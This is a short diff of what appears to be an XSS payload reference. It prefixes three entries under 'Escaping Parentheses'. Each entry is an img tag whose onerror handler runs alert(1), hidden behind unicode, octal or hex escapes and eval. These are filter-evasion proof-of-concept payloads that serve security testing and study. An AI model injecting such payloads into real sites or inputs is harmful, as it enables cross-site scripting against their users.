@@ -162,11 +162,11 @@ Add execution sink for execution:
   
 ### Escaping Parentheses
   
-<img src=x onerror="\u0061lert(1)"/>
+-> <img src=x onerror="\u0061lert(1)"/>
   
-<img src=x onerror="eval('\141lert(1)')"/>
+-> <img src=x onerror="eval('\141lert(1)')"/>
   
-<img src=x onerror="eval('\x61lert(1)')"/>
+-> <img src=x onerror="eval('\x61lert(1)')"/>
   
 ### Others Examples
   
